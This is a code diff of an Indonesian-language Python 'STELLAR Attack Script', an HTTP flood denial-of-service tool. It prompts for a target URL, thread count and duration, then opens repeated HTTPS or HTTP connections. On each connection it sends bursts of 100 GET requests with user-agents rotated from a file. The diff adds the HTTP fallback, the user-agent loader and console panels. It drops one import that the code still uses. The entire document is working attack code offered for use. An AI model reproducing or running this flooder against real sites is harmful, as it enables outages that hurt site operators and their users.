@@ -2,17 +2,15 @@ import os
 import subprocess
 import sys
 import threading
-import requests
-import datetime
-import time
 import socket
 import ssl
 import random
+import time
+import datetime
 from urllib.parse import urlparse
 from sys import stdout
-from colorama import Fore, init
 from rich.console import Console
-from bs4 import BeautifulSoup as beautifulsoup
+from rich.panel import Panel
 
 # Daftar modul yang diperlukan
 required_modules = [
@@ -48,25 +46,45 @@ K2 = "[#FFFF00]"  # KUNING
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
+# Load user-agent dari file ua.txt
+def load_user_agents():
+    try:
+        with open('ua.txt', 'r') as file:
+            return [line.strip() for line in file.readlines() if line.strip()]
+    except FileNotFoundError:
+        console.print(Panel(f"{M2}File ua.txt tidak ditemukan. Pastikan file tersebut ada di direktori yang sama.", style="bold red"))
+        sys.exit(1)
+
 # Main command function
 def command():
     try:
-        target = console.input(f' {H2}• {K2}URL :{H2} ')
-        thread = int(console.input(f' {H2}• {K2}JUMLAH THREAD :{H2} '))
-        t = int(console.input(f' {H2}• {K2}WAKTU (detik) :{H2} '))
+        # Panel for user input
+        console.print(Panel("[bold green]Serangan STELLAR Dimulai![/bold green]"))
+        
+        target = console.input(f'{H2}• {K2}Masukkan URL Target: {H2}')
+        thread = int(console.input(f'{H2}• {K2}Jumlah Thread: {H2}'))
+        t = int(console.input(f'{H2}• {K2}Durasi Serangan (detik): {H2}'))
         
         # Validate inputs
         if not target or thread <= 0 or t <= 0:
-            console.print(f"{M2}Input tidak valid, coba lagi.", style="bold red")
+            console.print(Panel(f"{M2}Input tidak valid, coba lagi.", style="bold red"))
             return
 
+        # Panel showing attack details
+        attack_panel = Panel(f"[bold cyan]Target: {target}[/bold cyan]\n"
+                             f"[bold yellow]Jumlah Thread: {thread}[/bold yellow]\n"
+                             f"[bold magenta]Durasi: {t} detik[/bold magenta]",
+                             title="[bold green]Detail Serangan[/bold green]",
+                             border_style="green")
+        console.print(attack_panel)
+        
         # Start attack and countdown
         threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
         countdown_thread = threading.Thread(target=countdown, args=(t,))
         countdown_thread.start()
         countdown_thread.join()
     except ValueError:
-        console.print(f"{M2}Input angka tidak valid.", style="bold red")
+        console.print(Panel(f"{M2}Input angka tidak valid.", style="bold red"))
 
 # Attack function
 def attackSTELLAR(url, timer, threads):
@@ -76,10 +94,11 @@ def attackSTELLAR(url, timer, threads):
 # Attack process
 def LaunchSTELLAR(url, timer):
     end_time = time.time() + timer
-    req = (
-        f"GET / HTTP/1.1\r\nHost: {urlparse(url).netloc}\r\n"
+    user_agents = load_user_agents()  # Load user agents from ua.txt
+    req_template = (
+        "GET / HTTP/1.1\r\nHost: {host}\r\n"
         "Cache-Control: no-cache\r\n"
-        f"User-Agent: {random.choice(ua)}\r\n"
+        "User-Agent: {ua}\r\n"
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
         "Sec-Fetch-Site: same-origin\r\n"
         "Sec-GPC: 1\r\n"
@@ -88,22 +107,37 @@ def LaunchSTELLAR(url, timer):
         "Upgrade-Insecure-Requests: 1\r\n"
         "Connection: Keep-Alive\r\n\r\n"
     )
+
     while time.time() < end_time:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((urlparse(url).netloc, 443))
-            ctx = ssl.create_default_context()
-            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            host = urlparse(url).netloc
+
+            # Coba koneksi HTTPS (port 443)
+            try:
+                s.connect((host, 443))
+                ctx = ssl.create_default_context()
+                s = ctx.wrap_socket(s, server_hostname=host)
+            except Exception:
+                # Jika HTTPS gagal, coba HTTP (port 80)
+                console.print(Panel(f"{K2}Gagal koneksi HTTPS, mencoba HTTP...", style="bold yellow"))
+                s.connect((host, 80))
+
+            # Siapkan request dengan user-agent acak
+            req = req_template.format(host=host, ua=random.choice(user_agents))
             s.send(req.encode())
+
             try:
                 for _ in range(100):
                     s.send(req.encode())
+                time.sleep(0.1)  # Menambahkan jeda antara permintaan
             except Exception as e:
-                console.print(f"{M2}Terjadi kesalahan saat mengirim permintaan: {e}", style="bold red")
+                console.print(Panel(f"Terjadi kesalahan saat mengirim permintaan: {e}", style="bold red"))
             finally:
                 s.close()
         except Exception as e:
-            console.print(f"{M2}Kesalahan koneksi: {e}", style="bold red")
+            console.print(Panel(f"Kesalahan koneksi: {e}", style="bold red"))
+            time.sleep(1)  # Menambahkan jeda sebelum mencoba lagi
 
 # Countdown function
 def countdown(t):
@@ -112,19 +146,16 @@ def countdown(t):
         remaining_time = (until - datetime.datetime.now()).total_seconds()
         if remaining_time > 0:
             stdout.flush()
-            stdout.write(f"\r {Fore.MAGENTA}•{Fore.WHITE} Status serangan => {remaining_time:.2f} detik tersisa ")
+            console.print(f"Status serangan => {remaining_time:.2f} detik tersisa", end="\r")
         else:
             stdout.flush()
-            stdout.write(f"\r {Fore.MAGENTA}•{Fore.WHITE} Serangan selesai!\n")
+            console.print(Panel("[bold green]Serangan selesai![/bold green]", style="green"))
             return
 
 # Entry point
 if __name__ == '__main__':
     init(convert=True)
-    ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-          "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
-          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"]
-    
     clear()
+    console.print(Panel("[bold cyan]Selamat Datang di STELLAR Attack Script[/bold cyan]", style="bold cyan"))
     while True:
         command()
